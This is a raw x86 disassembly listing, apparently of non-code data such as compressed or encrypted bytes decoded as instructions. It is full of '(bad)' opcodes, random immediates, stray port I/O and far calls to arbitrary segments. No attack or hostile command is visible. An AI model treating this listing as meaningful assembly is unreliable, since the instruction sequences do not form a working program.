  42f33b:	xor    dh,BYTE PTR [edi]
  42f33d:	add    eax,0x9322f7b1
	...
  42f3b2:	add    BYTE PTR [eax],al
  42f3b4:	loop   0x42f373
  42f3b6:	fadd   st(7),st
  42f3b8:	(bad)  
  42f3ba:	sti    
  42f3bb:	mov    ebp,0xca33a8a7
  42f3c0:	adc    cl,ch
  42f3c2:	mov    ah,0x3a
  42f3c4:	xchg   edx,eax
  42f3c5:	repz add DWORD PTR [eax],eax
  42f3c8:	test   BYTE PTR [eax],0x0
  42f3cb:	add    BYTE PTR [ebx-0x41],dh
  42f3ce:	xchg   ebp,eax
  42f3cf:	std    
  42f3d0:	ficomp DWORD PTR [ebp-0x70b15afb]
  42f3d6:	out    dx,al
  42f3d7:	jle    0x42f381
  42f3d9:	cmp    dh,BYTE PTR [ecx+esi*8]
  42f3dc:	in     al,dx
  42f3dd:	call   0x8aeb:0x32134350
  42f3e4:	in     eax,0x1f
  42f3e6:	lea    ebp,[esi+0x65e181da]
  42f3ec:	(bad)  
  42f3ed:	pop    es
  42f3ee:	pusha  
  42f3ef:	adc    esp,DWORD PTR [ebx-0x1f]
  42f3f2:	xor    al,0xe7
  42f3f4:	mov    esi,0xaa3ce9b3
  42f3f9:	sahf   
  42f3fa:	push   ebx
  42f3fb:	cmp    cl,BYTE PTR [ebx]
  42f3fd:	enter  0x82fe,0xca
  42f401:	out    0xca,al
  42f403:	dec    esp
  42f404:	fnstcw WORD PTR [ebx-0x415d8db6]
  42f40a:	inc    eax
  42f40b:	retf   
  42f40c:	out    dx,al
  42f40d:	ds loopne 0x42f46b
  42f410:	test   DWORD PTR [ecx+0x1738a8c1],0xad264ab8
  42f41a:	aas    
  42f41b:	cmp    esi,DWORD PTR [ecx+0x6f]
  42f41e:	cmp    ah,BYTE PTR [edx-0x41]
  42f421:	mov    DWORD PTR [edx+0x4d59d340],esi
  42f427:	rol    cl,0x1e
  42f42a:	add    DWORD PTR [esi-0x435b0c33],edx
  42f430:	add    dh,BYTE PTR [esp+eax*4-0x47]
  42f434:	test   BYTE PTR [esi-0x43],0xe8
  42f438:	ror    DWORD PTR ss:[edi+0x1b8e029b],cl
  42f43f:	jno    0x42f485
  42f441:	xchg   edi,eax
  42f442:	xor    eax,0xccdb9d07
  42f447:	fs mov ebp,0x64eb6887
  42f44d:	jbe    0x42f463
  42f44f:	mov    ds:0x8a09c36f,al
  42f454:	cmp    ecx,edi
  42f456:	mov    eax,0x239e6163
  42f45b:	out    0x34,eax
  42f45d:	xor    bl,BYTE PTR [ebx-0x71]
  42f460:	pop    esi
  42f461:	inc    ebp
  42f462:	cmp    edi,eax
  42f464:	loopne 0x42f49c
  42f466:	shr    BYTE PTR [ecx-0x19],1
  42f469:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f46a:	js     0x42f4b8
  42f46c:	loope  0x42f4d1
  42f46e:	dec    ebp
  42f46f:	mov    BYTE PTR [ecx-0x12],dl
  42f472:	push   ds
  42f473:	mov    ah,0xfc
  42f475:	jne    0x42f40b
  42f477:	out    dx,al
  42f478:	pop    ebx
  42f479:	jns    0x42f4a9
  42f47b:	cmp    BYTE PTR [edi+0xa6e1c27],dh
  42f481:	gs mov esp,0x1af38aba
  42f487:	push   ebx
  42f488:	int    0x7
  42f48a:	mov    dl,0x86
  42f48c:	inc    ebp
  42f48d:	mov    ds:0x3bbfd83d,al
  42f492:	jns    0x42f479
  42f494:	mov    cl,0x79
  42f496:	lahf   
  42f497:	nop
  42f498:	xor    eax,0x2a6575fc
  42f49d:	ins    BYTE PTR es:[edi],dx
  42f49e:	in     al,0xda
  42f4a0:	mov    eax,0x26763d25
  42f4a5:	adc    DWORD PTR [ebx],ebp
  42f4a7:	(bad)  
  42f4a8:	into   
  42f4a9:	sbb    ebx,edi
  42f4ab:	fistp  WORD PTR [edi+0x6f35999f]
  42f4b1:	cmp    esi,DWORD PTR [ebp+0x441a8f5b]
  42f4b7:	rcl    DWORD PTR [ecx+0x41],0x3
  42f4bb:	stos   BYTE PTR es:[edi],al
  42f4bc:	jg     0x42f4c6
  42f4be:	mov    eax,0x980c9d
	...
  42f533:	add    BYTE PTR [ebp+0x38],dl
  42f536:	into   
  42f537:	adc    bh,ch
  42f539:	neg    bh
  42f53b:	jge    0x42f546
  42f53d:	push   cs
  42f53e:	xchg   BYTE PTR [edi+0xd],bh
  42f541:	lea    eax,ds:0x1f48842
  42f547:	add    dh,dh
  42f549:	add    BYTE PTR [eax],al
  42f54b:	add    cl,bh
  42f54d:	mov    ecx,DWORD PTR [esi-0x75f1309d]
  42f553:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f554:	sub    dh,BYTE PTR [edi+ecx*2+0x1258027b]
  42f55b:	add    eax,0xed53d82d
  42f560:	fbld   TBYTE PTR [ecx+eiz*8]
  42f563:	cmp    BYTE PTR [edi],bl
  42f565:	push   edi
  42f566:	les    eax,FWORD PTR [edx+0x40]
  42f569:	xor    bl,bh
  42f56b:	adc    ebx,DWORD PTR [ebx-0x77dcd22e]
  42f571:	test   esp,ebp
  42f573:	outs   dx,BYTE PTR ds:[esi]
  42f574:	call   0xd3ae178d
  42f579:	enter  0x27df,0x73
  42f57d:	mov    ebp,0x8fb6083a
  42f582:	scas   al,BYTE PTR es:[edi]
  42f583:	scas   al,BYTE PTR es:[edi]
  42f584:	mov    ecx,0x4b921fdb
  42f589:	(bad)  
  42f58a:	jmp    0x42f539
  42f58c:	cli    
  42f58d:	xor    eax,0xe79d60a
  42f592:	lock fs mov al,0xb2
  42f596:	xor    al,0x88
  42f598:	and    esp,DWORD PTR [edi]
  42f59a:	or     ebp,DWORD PTR [esi+edi*1-0x4de28f10]
  42f5a1:	or     DWORD PTR [edx-0x3c],esi
  42f5a4:	iret   
  42f5a5:	loope  0x42f5b5
  42f5a7:	push   0x71ea3157
  42f5ac:	mov    esp,0xff55e9a5
  42f5b1:	aam    0x34
  42f5b3:	fwait
  42f5b4:	and    eax,0xef136c7f
  42f5b9:	sbb    BYTE PTR [edx-0x9524623],0xaf
  42f5c0:	retf   
  42f5c1:	mov    esi,0x7395cd05
  42f5c6:	ret    
  42f5c7:	push   0x4e
  42f5c9:	rcl    ch,1
  42f5cb:	push   edi
  42f5cc:	jg     0x42f612
  42f5ce:	test   DWORD PTR [ecx-0x7a3fcdac],ebx
  42f5d4:	mov    edi,0xbc548c5b
  42f5d9:	shr    BYTE PTR [edi+0x24],1
  42f5dc:	shl    BYTE PTR [edx+edx*2-0x134d60ad],1
  42f5e3:	loop   0x42f570
  42f5e5:	stc    
  42f5e6:	mov    ds:0xf8e5b8f6,eax
  42f5eb:	inc    edx
  42f5ec:	aam    0xcd
  42f5ee:	cmp    DWORD PTR [ebp-0x1c],ebx
  42f5f1:	and    ebx,DWORD PTR [esi-0x31fd6a20]
  42f5f7:	sub    edx,DWORD PTR [esi-0x51]
  42f5fa:	fcom   QWORD PTR [esi-0x22adecf9]
  42f600:	retf   
  42f601:	mov    cs,WORD PTR [eax+0xc]
  42f604:	and    al,0xc7
  42f606:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f607:	add    al,0x88
  42f609:	mov    WORD PTR [ecx+0x48c0588],gs
  42f60f:	pop    DWORD PTR [edi+0x7d]
  42f612:	fsub   DWORD PTR [eax-0x52]
  42f615:	lds    edx,FWORD PTR [edi+0x5f165380]
  42f61b:	(bad)  
  42f61d:	es and eax,0x4709e9c7
  42f623:	xchg   edi,eax
  42f624:	mov    dh,0x27
  42f626:	sub    esi,esp
  42f628:	lds    edi,FWORD PTR [esi-0x41]
  42f62b:	and    eax,0xae670cb1
  42f630:	push   edi
  42f631:	cs jl  0x42f67e
  42f634:	pop    ss
  42f635:	ja     0x42f61a
  42f637:	outs   dx,DWORD PTR ds:[esi]
  42f638:	je     0x42f5d4
  42f63a:	dec    ebp
  42f63b:	sbb    esp,DWORD PTR [ebx+ecx*8-0x51b69da5]
	...
  42f6b2:	add    BYTE PTR [eax],al
  42f6b4:	pop    edx
  42f6b5:	cmp    DWORD PTR [esi+0x2d],ecx
  42f6b8:	outs   dx,DWORD PTR ds:[esi]
  42f6b9:	jg     0x42f736
  42f6bb:	jg     0x42f6c6
  42f6bd:	mov    bh,0xe3
  42f6bf:	xor    bh,bl
  42f6c1:	retf   0x42b4
  42f6c4:	jle    0x42f6bb
  42f6c6:	add    DWORD PTR [eax],eax
  42f6c8:	test   BYTE PTR [eax],0x0
  42f6cb:	add    BYTE PTR [ecx+0x11],ch
  42f6ce:	adc    bh,0x4f
  42f6d1:	lods   eax,DWORD PTR ds:[esi]
  42f6d2:	shl    DWORD PTR [edx+0x16],0xe8
  42f6d6:	aad    0x7a
  42f6d8:	mov    ds:0xc3ad6651,al
  42f6dd:	out    0x60,al
  42f6df:	mov    ah,0x25
  42f6e1:	aad    0x25
  42f6e3:	jmp    0x6ff2:0xca2dea2e
  42f6ea:	test   eax,0x5da0abc8
  42f6ef:	sbb    DWORD PTR [esi-0x33],0xeb10ad2b
  42f6f6:	xchg   ebp,eax
  42f6f7:	(bad)  
  42f6f8:	dec    esi
  42f6f9:	neg    DWORD PTR [esp+ebp*8+0x27]
  42f6fd:	mov    cl,0xfd
  42f6ff:	push   edi
  42f700:	sbb    edx,DWORD PTR [edi+0x5d]
  42f703:	push   cs
  42f704:	loope  0x42f6e4
  42f706:	xchg   DWORD PTR [edx+0x5f],ecx
  42f709:	adc    eax,0x13118c96
  42f70e:	lods   eax,DWORD PTR ds:[esi]
  42f70f:	out    0xe7,eax
  42f711:	adc    BYTE PTR [edx],cl
  42f713:	cli    
  42f714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f715:	nop    DWORD PTR [ebp+0x62f7cd38]
  42f71c:	or     eax,0xf28a3bf8
  42f721:	adc    DWORD PTR [edi],ebx
  42f723:	dec    esi
  42f724:	jle    0x42f761
  42f726:	(bad)
  42f72a:	pop    ebp
  42f72b:	mov    ecx,0x27cf1438
  42f730:	popf   
  42f731:	inc    ebp
  42f732:	dec    edx
  42f733:	push   ss
  42f734:	pusha  
  42f735:	jae    0x42f707
  42f737:	dec    edx
  42f738:	inc    eax
  42f739:	aas    
  42f73a:	sub    BYTE PTR [ebx-0x6],dh
  42f73d:	test   DWORD PTR [edi+0x5ef06ec2],ecx
  42f743:	and    esi,DWORD PTR [esi+0x59]
  42f746:	(bad)  
  42f748:	mov    esi,0x18989ee8
  42f74d:	adc    al,ah
  42f74f:	(bad)  
  42f750:	mov    ds:0x2769d347,eax
  42f755:	popf   
  42f756:	mov    edi,0xe78d15fc
  42f75b:	test   BYTE PTR [edi+0x1ac0822f],ah
  42f761:	(bad)  
  42f762:	aas    
  42f763:	push   cs
  42f764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f765:	mov    ebp,0x9df9de09
  42f76a:	(bad)  
  42f76c:	fidivr WORD PTR [edi-0x2cc951bd]
  42f772:	or     DWORD PTR [edi-0x3e48b9ff],0xffffffa2
  42f779:	mov    ecx,0x1a80d8dd
  42f77e:	jg     0x42f770
  42f780:	into   
  42f781:	mov    ah,0xe
  42f783:	je     0x42f7d4
  42f785:	xor    eax,0xc72de91f
  42f78a:	adc    DWORD PTR [esi+0x2a481091],eax
  42f790:	adc    cl,ah
  42f792:	out    0x33,eax
  42f794:	mov    edx,0x601497f4
  42f799:	sub    BYTE PTR [edx+0x7d6bac74],bh
  42f79f:	inc    edx
  42f7a0:	mov    bh,BYTE PTR [esi]
  42f7a2:	into   
  42f7a3:	scas   eax,DWORD PTR es:[edi]
  42f7a4:	or     eax,0x68765d6d
  42f7a9:	push   edi
  42f7aa:	mov    DWORD PTR [ebx-0x2b],edx
  42f7ad:	inc    ebx
  42f7ae:	rol    ebp,1
  42f7b0:	mov    DWORD PTR ds:0x63390c96,ebp
  42f7b6:	(bad)  
  42f7b7:	push   esi
  42f7b8:	and    al,0x1e
  42f7ba:	inc    eax
  42f7bb:	in     eax,0x69
  42f7bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f7be:	push   esi
  42f7bf:	ins    DWORD PTR es:[edi],dx
  42f7c0:	div    DWORD PTR [esi+0x0]
	...
  42f833:	add    bl,al
  42f835:	ja     0x42f897
  42f837:	and    al,0xf4
  42f839:	aaa    
  42f83a:	(bad)  
  42f83b:	neg    DWORD PTR [edi+0x2f50c88f]
  42f841:	jae    0x42f8b9
  42f843:	and    DWORD PTR [esi+esi*8+0x1],esi
  42f847:	add    dh,dh
  42f849:	add    BYTE PTR [eax],al
  42f84b:	add    BYTE PTR [eax-0x66],al
  42f84e:	mov    edx,0xca979aa2
  42f853:	lods   al,BYTE PTR ds:[esi]
  42f854:	fcomp  QWORD PTR [ebx-0x42]
  42f857:	fs jno 0x42f8c0
  42f85a:	pop    ebp
  42f85b:	mov    ch,0x3c
  42f85d:	adc    al,0xea
  42f85f:	enter  0x69fa,0x97
  42f863:	repz ds cmc 
  42f866:	pushf  
  42f867:	test   DWORD PTR ds:0x8568ad90,edi
  42f86d:	outs   dx,BYTE PTR ds:[esi]
  42f86e:	shl    DWORD PTR [ecx+0x2e],1
  42f871:	sar    BYTE PTR [ebp+0x22],cl
  42f874:	dec    ebp
  42f875:	ja     0x42f804
  42f877:	and    edx,DWORD PTR [ebp+0x1840f5d3]
  42f87d:	inc    esi
  42f87e:	(bad)  
  42f87f:	aaa    
  42f880:	and    DWORD PTR [ebx+0x48a79f58],edx
  42f886:	out    0x9f,al
  42f888:	mov    BYTE PTR [esi+0x2d],bh
  42f88b:	mov    al,ds:0x23adc3df
  42f890:	aam    0x9f
  42f892:	stos   BYTE PTR es:[edi],al
  42f893:	push   0xc3803f60
  42f898:	hlt    
  42f899:	xor    edi,ecx
  42f89b:	hlt    
  42f89c:	xor    cl,ah
  42f89e:	push   ds
  42f89f:	push   esi
  42f8a0:	mul    DWORD PTR gs:[ebp+edi*1-0x43e91cab]
  42f8a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f8a9:	mov    edi,0x83999d9b
  42f8ae:	das    
  42f8af:	mov    DWORD PTR [edx],edi
  42f8b1:	loop   0x42f911
  42f8b3:	out    0x34,eax
  42f8b5:	cmc    
  42f8b6:	pushf  
  42f8b7:	call   0x40f8:0xb89b65de
  42f8be:	stc    
  42f8bf:	push   cs
  42f8c0:	xchg   edx,eax
  42f8c1:	hlt    
  42f8c2:	ins    DWORD PTR es:[edi],dx
  42f8c3:	xor    dl,al
  42f8c5:	fbstp  TBYTE PTR [ecx]
  42f8c7:	sbb    BYTE PTR [eax+0x74],dh
  42f8ca:	xor    esp,edi
  42f8cc:	push   ebx
  42f8cd:	sbb    bh,BYTE PTR [edx]
  42f8cf:	cmp    eax,0xfdc5c990
  42f8d4:	fadd   QWORD PTR [eax+eax*4-0x47]
  42f8d8:	outs   dx,BYTE PTR ds:[esi]
  42f8d9:	dec    esi
  42f8da:	push   ds
  42f8db:	ficom  DWORD PTR [esi+0x22f89cbe]
  42f8e1:	lock ja 0x42f8ab
  42f8e4:	sub    ebx,eax
  42f8e6:	mov    al,ds:0x6ea549b7
  42f8eb:	and    edi,DWORD PTR fs:0x38a48f6e
  42f8f2:	cmp    al,BYTE PTR [eax-0x7b]
  42f8f5:	arpl   sp,di
  42f8f7:	and    al,0x2d
  42f8f9:	push   ebp
  42f8fa:	loop   0x42f930
  42f8fc:	aam    0x70
  42f8fe:	jbe    0x42f88a
  42f900:	fdiv   DWORD PTR [ebp+0x4]
  42f903:	adc    ecx,esi
  42f905:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f906:	cmp    DWORD PTR [ecx+0x40c32c0e],ebx
  42f90c:	dec    edi
  42f90d:	jmp    0x42f8d2
  42f90f:	inc    eax
  42f910:	push   edx
  42f911:	dec    esi
  42f912:	adc    ebp,ecx
  42f914:	jne    0x42f8b3
  42f916:	push   esi
  42f917:	xlat   BYTE PTR ds:[ebx]
  42f918:	add    ebp,eax
  42f91a:	adc    dl,cl
  42f91c:	cmp    edx,DWORD PTR [esi+eiz*2+0x57]
  42f920:	xor    ch,al
  42f922:	cmp    edx,0x51
  42f925:	in     al,dx
  42f926:	sbb    al,BYTE PTR [ebx]
  42f928:	mov    ebx,0x3545ed3
  42f92d:	mov    edx,0xa487df07
  42f932:	push   edi
  42f933:	loope  0x42f94c
  42f935:	pop    ss
  42f936:	mov    bl,0xfb
  42f938:	jbe    0x42f951
  42f93a:	test   BYTE PTR [ebp-0x3e],0xd9
  42f93e:	call   FWORD PTR [edi+0x2fd5]
	...
  42f9b4:	in     eax,0xba
  42f9b6:	xchg   edx,eax
  42f9b7:	jecxz  0x42f998
  42f9b9:	jmp    0x42f9b0
  42f9bb:	mov    esi,0x4d34a307
  42f9c0:	ss in  eax,0x19
  42f9c3:	mov    esi,0x1f76a
  42f9c8:	test   BYTE PTR [eax],0x0
  42f9cb:	add    BYTE PTR [ebx+0x58749941],ah
  42f9d1:	pop    ecx
  42f9d2:	std    
  42f9d3:	ret    
  42f9d4:	or     ah,bh
  42f9d6:	mov    edi,0xb68e5fe2
  42f9db:	das    
  42f9dc:	popa   
  42f9dd:	pusha  
  42f9de:	xor    DWORD PTR [ecx+0x27],eax
  42f9e1:	pop    esp
  42f9e2:	pop    eax
  42f9e3:	enter  0xc141,0x3a
  42f9e7:	mov    ds:0x119bf603,al
  42f9ec:	push   esp
  42f9ed:	clc    
  42f9ee:	aam    0x55
  42f9f0:	xchg   ecx,eax
  42f9f1:	cs jno 0x42fa72
  42f9f4:	lock xor bh,BYTE PTR [ecx]
  42f9f7:	lock imul ecx,DWORD PTR es:[ebp+0x18c420ca],0x748cf71
  42fa03:	js     0x42f9ca
  42fa05:	scas   al,BYTE PTR es:[edi]
  42fa06:	fdiv   DWORD PTR ds:0x1f15a9de
  42fa0c:	mov    bl,0x2f
  42fa0e:	je     0x42fa34
  42fa10:	inc    edi
  42fa11:	xor    esp,ebp
  42fa13:	push   esp
  42fa14:	cmp    eax,0xd679008c
  42fa19:	pop    es
  42fa1a:	std    
  42fa1b:	mov    DWORD PTR [ecx+0x7c3665dd],esp
  42fa21:	shl    ch,cl
  42fa23:	retf   
  42fa24:	retf   0x3dc7
  42fa27:	dec    ebp
  42fa28:	and    DWORD PTR [esi],esi
  42fa2a:	adc    al,0xd2
  42fa2c:	scas   eax,DWORD PTR es:[edi]
  42fa2d:	retf   
  42fa2e:	pop    ds
  42fa2f:	mov    DWORD PTR [edx+ecx*2-0x1157a573],ebx
  42fa36:	loopne 0x42fab7
  42fa38:	fisub  WORD PTR es:[esp+edx*1]
  42fa3c:	test   eax,0xd643d637
  42fa41:	leave  
  42fa42:	enter  0x4fb2,0xcc
  42fa46:	push   es
  42fa47:	dec    edx
  42fa48:	and    ecx,DWORD PTR [esi]
  42fa4a:	test   DWORD PTR [esi+0xc],ecx
  42fa4d:	into   
  42fa4e:	in     eax,dx
  42fa4f:	in     eax,dx
  42fa50:	adc    eax,0xd23a3a6e
  42fa55:	pop    ss
  42fa56:	add    al,0x7
  42fa58:	push   edi
  42fa59:	push   0xfffffffb
  42fa5b:	sbb    al,0xb6
  42fa5d:	jge    0x42faa0
  42fa5f:	pop    ebx
  42fa60:	cmp    BYTE PTR [edx-0x3be25f9c],cl
  42fa66:	jp     0x42fabe
  42fa68:	in     al,dx
  42fa69:	je     0x42f9ee
  42fa6b:	shl    DWORD PTR [edi+0x435da660],1
  42fa71:	push   ecx
  42fa72:	jno    0x42facd
  42fa74:	(bad)  
  42fa75:	stc    
  42fa76:	outs   dx,BYTE PTR ds:[esi]
  42fa77:	std    
  42fa78:	sub    ecx,DWORD PTR [ebp-0x6d]
  42fa7b:	jl     0x42fa13
  42fa7d:	les    ecx,FWORD PTR [eax-0x6a5406d7]
  42fa83:	jl     0x42fab9
  42fa85:	xchg   DWORD PTR [esp+eax*2+0x4e0f0a4c],esp
  42fa8c:	mov    cl,0x19
  42fa8e:	sub    ebx,DWORD PTR [edx-0x2d]
  42fa91:	or     al,0xee
  42fa93:	add    BYTE PTR [eax-0x71325213],al
  42fa99:	cmp    esi,DWORD PTR [edi+esi*2-0x9006a67]
  42faa0:	call   0x7b8d3d75
  42faa5:	dec    eax
  42faa6:	loopne 0x42fb11
  42faa8:	add    cl,dl
  42faaa:	into   
  42faab:	xor    esp,DWORD PTR [edi+0x466d0036]
  42fab1:	push   0x37
  42fab3:	push   ecx
  42fab4:	js     0x42fb08
  42fab6:	call   0x9eb3c5d8
  42fabb:	jecxz  0x42fb15
  42fabd:	test   DWORD PTR [eax],edx
  42fabf:	and    eax,0x9256
	...
  42fb34:	jle    0x42fb77
  42fb36:	jne    0xfc41ca7b
  42fb3c:	cmp    DWORD PTR [ebx+0x4a],ebp
  42fb3f:	pop    es
  42fb40:	cmp    al,0x52
  42fb42:	popf   
  42fb43:	jl     0x42fba5
  42fb45:	clc    
  42fb46:	add    DWORD PTR [eax],eax
  42fb48:	test   BYTE PTR [eax],0x0
  42fb4b:	add    BYTE PTR [esi],bl
  42fb4d:	in     eax,0xbe
  42fb4f:	out    0x9d,eax
  42fb51:	(bad)  
  42fb52:	xchg   ebx,eax
  42fb53:	imul   ebx,DWORD PTR ds:0x629765e3,0x61
  42fb5a:	lock pop ds
  42fb5c:	mov    ds:0xb4843b3e,al
  42fb61:	icebp  
  42fb62:	call   0x6379:0x1cb71c20
  42fb69:	es add eax,0x7d6ddfc8
  42fb6f:	rcl    DWORD PTR [esi],1
  42fb71:	mov    cl,BYTE PTR [esi+0x35180d6b]
  42fb77:	cwde   
  42fb78:	popa   
  42fb79:	inc    ebx
  42fb7a:	push   edi
  42fb7b:	cwde   
  42fb7c:	jae    0x42fb4e
  42fb7e:	sub    edx,DWORD PTR ds:0xf2a78de9
  42fb84:	ins    DWORD PTR es:[edi],dx
  42fb85:	jno    0x42fb42
  42fb87:	and    eax,0x398af6eb
  42fb8c:	sti    
  42fb8d:	out    dx,al
  42fb8e:	ss mov cl,0xad
  42fb91:	xchg   esi,eax
  42fb92:	jnp    0x42fbbb
  42fb94:	lock mov BYTE PTR [edi],ah
  42fb97:	(bad)  
  42fb98:	lahf   
  42fb99:	fdivp  st(6),st
  42fb9b:	add    al,0x84
  42fb9d:	fsub   QWORD PTR [ecx+edi*8+0x7e]
  42fba1:	dec    ecx
  42fba2:	jns    0x42fb76
  42fba4:	pop    edi
  42fba5:	add    BYTE PTR [eax+ecx*2-0x32],dh
  42fba9:	imul   edi,DWORD PTR [ebx],0x30
  42fbac:	jae    0x42fc1e
  42fbae:	idiv   DWORD PTR [ecx+0x6edb4a2e]
  42fbb4:	jae    0x42fbb5
  42fbb6:	mov    ebx,0xdfc4add6
  42fbbb:	call   0x3850:0xbe1708a2
  42fbc2:	xchg   ecx,eax
  42fbc3:	jmp    0x3884e2c2
  42fbc8:	icebp  
  42fbc9:	xchg   ecx,eax
  42fbca:	and    DWORD PTR [edi+0x76],0xe6598cd2
  42fbd1:	mov    edx,0xeb2643df
  42fbd6:	pop    ds
  42fbd7:	cmp    DWORD PTR ds:0x7d6690d0,ebx
  42fbdd:	add    bh,bh
  42fbdf:	arpl   WORD PTR [ebp+0x49e9d680],bx
  42fbe5:	cmc    
  42fbe6:	mov    ds:0x2a6f3491,al
  42fbeb:	xchg   edx,eax
  42fbec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fbed:	cdq    
  42fbee:	loopne 0x42fc2c
  42fbf0:	jg     0x42fbf6
  42fbf2:	inc    ebp
  42fbf3:	(bad)  
  42fbf4:	in     al,0x63
  42fbf6:	je     0x42fc05
  42fbf8:	push   0xce0a7afb
  42fbfd:	jno    0x42fc65
  42fbff:	sub    dh,BYTE PTR [esi]
  42fc01:	cmp    BYTE PTR [esi],bh
  42fc03:	mov    ecx,0xe6e2a3c4
  42fc08:	push   esi
  42fc09:	aam    0xb7
  42fc0b:	hlt    
  42fc0c:	test   ah,al
  42fc0e:	std    
  42fc0f:	pop    ds
  42fc10:	cmc    
  42fc11:	sub    ch,BYTE PTR [eax]
  42fc13:	push   es
  42fc14:	xor    eax,0x3b6287f0
  42fc19:	push   edx
  42fc1a:	jne    0x42fc8f
  42fc1c:	xchg   DWORD PTR [edx+edi*1+0x15],ebp
  42fc20:	fs or  al,0xf4
  42fc23:	fadd   QWORD PTR [edx+0x7f2a8bef]
  42fc29:	and    al,0x91
  42fc2b:	das    
  42fc2c:	jbe    0x42fbcc
  42fc2e:	mov    edi,0xf79901eb
  42fc33:	fld    TBYTE PTR [ebx-0x69]
  42fc36:	imul   edx,ebx,0x6c2d9bde
  42fc3c:	and    esi,ebx
  42fc3e:	push   ecx
  42fc3f:	aam    0xbc
  42fc41:	lahf   
	...
  42fcb2:	add    BYTE PTR [eax],al
  42fcb4:	sub    dh,dh
  42fcb6:	scas   eax,DWORD PTR es:[edi]
  42fcb7:	fdivr  st,st(7)
  42fcb9:	fnstcw WORD PTR [edi-0xa]
  42fcbc:	cmp    DWORD PTR [esp+ebx*2],0x95d8bab9
  42fcc3:	not    BYTE PTR [esi-0x7]
  42fcc6:	add    DWORD PTR [eax],eax
  42fcc8:	test   BYTE PTR [eax],0x0
  42fccb:	add    ah,bl
  42fccd:	(bad)  
  42fcce:	aas    
  42fccf:	hlt    
  42fcd0:	fld    QWORD PTR [eax+0x2b8405d]
  42fcd6:	cs sar bh,cl
  42fcd9:	mov    gs,WORD PTR [eax+0x11]
  42fcdc:	jno    0x42fd4c
  42fcde:	inc    ebp
  42fcdf:	aaa    
  42fce0:	test   DWORD PTR [ebp+0x61],ebp
  42fce3:	sbb    BYTE PTR [edx],al
  42fce5:	add    ebp,ebx
  42fce7:	in     eax,dx
  42fce8:	mov    dl,0x2e
  42fcea:	cli    
  42fceb:	mov    dl,0x19
  42fced:	in     al,dx
  42fcee:	std    
  42fcef:	push   edi
  42fcf0:	jmp    0xc66ca4b1
  42fcf5:	jp     0x42fd32
  42fcf7:	dec    ebx
  42fcf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fcf9:	cli    
  42fcfa:	xchg   BYTE PTR [esi],dl
  42fcfc:	add    bh,bh
  42fcfe:	xor    DWORD PTR [ebp*8-0x26aaa403],ecx
  42fd05:	cwde   
  42fd06:	addr16 js 0x42fcb9
  42fd09:	leave  
  42fd0a:	or     DWORD PTR [esi+0x6ec4a713],esi
  42fd10:	lods   al,BYTE PTR ds:[esi]
  42fd11:	mov    ebp,DWORD PTR [esi+eiz*2+0x37178fc]
  42fd18:	xchg   esi,eax
  42fd19:	scas   al,BYTE PTR es:[edi]
  42fd1a:	cmp    bh,BYTE PTR [eax+ebx*4+0x47]
  42fd1e:	das    
  42fd1f:	scas   eax,DWORD PTR es:[edi]
  42fd20:	rcr    BYTE PTR ds:[ebx],cl
  42fd23:	cli    
  42fd24:	add    DWORD PTR [esi+0x23141deb],eax
  42fd2a:	jnp    0x42fcb7
  42fd2c:	push   0xffffffe0
  42fd2e:	xlat   BYTE PTR ds:[ebx]
  42fd2f:	lock lock sar ebx,1
  42fd33:	gs add esi,esp
  42fd36:	test   eax,0xa8a400ec
  42fd3b:	les    ebp,FWORD PTR [edx]
  42fd3d:	or     bl,bl
  42fd3f:	test   al,0x24
  42fd41:	ror    DWORD PTR [ebp-0x7c],0x9e
  42fd45:	dec    BYTE PTR [ebx]
  42fd47:	mov    eax,0x561275bd
  42fd4c:	addr16 inc esi
  42fd4e:	push   ds
  42fd4f:	push   cs
  42fd50:	sahf   
  42fd51:	inc    edi
  42fd52:	or     al,0x2
  42fd54:	inc    ebx
  42fd55:	mov    cl,0xdf
  42fd57:	jo     0x42fdd2
  42fd59:	ret    0x7fd7
  42fd5c:	mov    ds,ebp
  42fd5e:	pop    ecx
  42fd5f:	bound  edx,QWORD PTR [ebx-0x67]
  42fd62:	(bad)  
  42fd63:	mov    ecx,0x9de2aa36
  42fd68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd69:	pop    es
  42fd6a:	(bad)
  42fd6d:	out    0xe7,al
  42fd6f:	outs   dx,DWORD PTR ds:[esi]
  42fd70:	jmp    DWORD PTR [ecx+0x44f66e31]
  42fd76:	not    BYTE PTR [ecx+0x7bf5da6b]
  42fd7c:	or     esi,esp
  42fd7e:	mov    eax,ds:0xff9c4732
  42fd83:	loopne 0x42fd07
  42fd85:	xor    edx,DWORD PTR [ebx-0x67]
  42fd88:	ficomp DWORD PTR [edi+0x63f543b0]
  42fd8e:	out    0x51,al
  42fd90:	loopne 0x42fd7a
  42fd92:	aas    
  42fd93:	ins    DWORD PTR es:[edi],dx
  42fd94:	mov    ecx,0xd5773fa8
  42fd99:	inc    esp
  42fd9a:	fwait
  42fd9b:	gs ds popa 
  42fd9e:	call   0x753d:0x8b33c75a
  42fda5:	fwait
  42fda6:	push   edi
  42fda7:	sbb    cl,ch
  42fda9:	pushf  
  42fdaa:	inc    esp
  42fdab:	adc    BYTE PTR [ecx],0xf6
  42fdae:	cmp    dl,BYTE PTR [ebx+eax*1-0x35]
  42fdb2:	shl    BYTE PTR [ebx+0x1d],cl
  42fdb5:	jg     0x42fd99
  42fdb7:	xchg   esi,eax
  42fdb8:	retf   0x1af4
  42fdbb:	xchg   edx,eax
  42fdbc:	hlt    
  42fdbd:	cmp    BYTE PTR [eax-0x62],bl
  42fdc0:	mov    cl,0xe2
	...
  42fe32:	add    BYTE PTR [eax],al
  42fe34:	ret    
  42fe35:	add    cl,BYTE PTR [eax]
  42fe37:	xor    eax,0xf6ff3fc9
  42fe3c:	xchg   esi,eax
  42fe3d:	fwait
  42fe3e:	bound  ebx,QWORD PTR [esi]
  42fe40:	mov    al,ds:0x4c4e3c76
  42fe45:	cli    
